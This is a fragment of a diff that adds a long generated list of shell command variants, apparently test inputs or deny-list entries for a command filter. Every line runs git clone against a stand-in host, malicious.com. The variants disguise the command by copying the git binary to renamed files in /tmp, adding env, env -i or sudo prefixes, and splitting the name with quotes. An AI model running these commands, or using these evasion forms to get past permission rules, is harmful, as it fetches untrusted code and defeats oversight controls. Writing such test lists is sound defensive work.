+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_64 && /tmp/tmp_bin_64 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_65 && /tmp/tmp_bin_65 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_66 && /tmp/tmp_bin_66 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_67 && /tmp/tmp_bin_67 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_68 && /tmp/tmp_bin_68 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_69 && /tmp/tmp_bin_69 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_7 && /tmp/tmp_bin_7 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_70 && /tmp/tmp_bin_70 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_71 && /tmp/tmp_bin_71 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_72 && /tmp/tmp_bin_72 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_73 && /tmp/tmp_bin_73 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_74 && /tmp/tmp_bin_74 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_75 && /tmp/tmp_bin_75 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_76 && /tmp/tmp_bin_76 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_77 && /tmp/tmp_bin_77 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_78 && /tmp/tmp_bin_78 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_79 && /tmp/tmp_bin_79 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_8 && /tmp/tmp_bin_8 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_80 && /tmp/tmp_bin_80 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_81 && /tmp/tmp_bin_81 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_82 && /tmp/tmp_bin_82 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_83 && /tmp/tmp_bin_83 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_84 && /tmp/tmp_bin_84 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_85 && /tmp/tmp_bin_85 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_86 && /tmp/tmp_bin_86 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_87 && /tmp/tmp_bin_87 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_88 && /tmp/tmp_bin_88 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_89 && /tmp/tmp_bin_89 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_9 && /tmp/tmp_bin_9 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_90 && /tmp/tmp_bin_90 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_91 && /tmp/tmp_bin_91 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_92 && /tmp/tmp_bin_92 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_93 && /tmp/tmp_bin_93 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_94 && /tmp/tmp_bin_94 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_95 && /tmp/tmp_bin_95 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_96 && /tmp/tmp_bin_96 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_97 && /tmp/tmp_bin_97 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_98 && /tmp/tmp_bin_98 clone http://malicious.com/repo.git
+cp $(which git 2>/dev/null || echo git) /tmp/tmp_bin_99 && /tmp/tmp_bin_99 clone http://malicious.com/repo.git
+env "git"  clone http://malicious.com/repo.git
+env "git" clone http://malicious.com/repo.git
+env "git"clone http://malicious.com/repo.git
+env 'git'  clone http://malicious.com/repo.git
+env 'git' clone http://malicious.com/repo.git
+env 'git'clone http://malicious.com/repo.git
+env -i "git"  clone http://malicious.com/repo.git
+env -i "git" clone http://malicious.com/repo.git
+env -i "git"clone http://malicious.com/repo.git
+env -i 'git'  clone http://malicious.com/repo.git
+env -i 'git' clone http://malicious.com/repo.git
+env -i 'git'clone http://malicious.com/repo.git
+env -i g""it  clone http://malicious.com/repo.git
+env -i g""it clone http://malicious.com/repo.git
+env -i g""itclone http://malicious.com/repo.git
+env -i g''it  clone http://malicious.com/repo.git
+env -i g''it clone http://malicious.com/repo.git
+env -i g''itclone http://malicious.com/repo.git
+env -i git  clone http://malicious.com/repo.git
+env -i git clone http://malicious.com/repo.git
+env -i gitclone http://malicious.com/repo.git
+env g""it  clone http://malicious.com/repo.git
+env g""it clone http://malicious.com/repo.git
+env g""itclone http://malicious.com/repo.git
+env g''it  clone http://malicious.com/repo.git
+env g''it clone http://malicious.com/repo.git
+env g''itclone http://malicious.com/repo.git
+env git  clone http://malicious.com/repo.git
+env git clone http://malicious.com/repo.git
+env gitclone http://malicious.com/repo.git
+g""it  clone http://malicious.com/repo.git
+g""it clone http://malicious.com/repo.git
+g""itclone http://malicious.com/repo.git
+g''it  clone http://malicious.com/repo.git
+g''it clone http://malicious.com/repo.git
+g''itclone http://malicious.com/repo.git
+git  clone http://malicious.com/repo.git
+git clone http://malicious.com/repo.git
+gitclone http://malicious.com/repo.git
+sudo "git"  clone http://malicious.com/repo.git
+sudo "git" clone http://malicious.com/repo.git
+sudo "git"clone http://malicious.com/repo.git
+sudo 'git'  clone http://malicious.com/repo.git
+sudo 'git' clone http://malicious.com/repo.git
+sudo 'git'clone http://malicious.com/repo.git
+sudo g""it  clone http://malicious.com/repo.git
+sudo g""it clone http://malicious.com/repo.git
+sudo g""itclone http://malicious.com/repo.git
+sudo g''it  clone http://malicious.com/repo.git
+sudo g''it clone http://malicious.com/repo.git
+sudo g''itclone http://malicious.com/repo.git
+sudo git  clone http://malicious.com/repo.git
+sudo git clone http://malicious.com/repo.git
+sudo gitclone http://malicious.com/repo.git
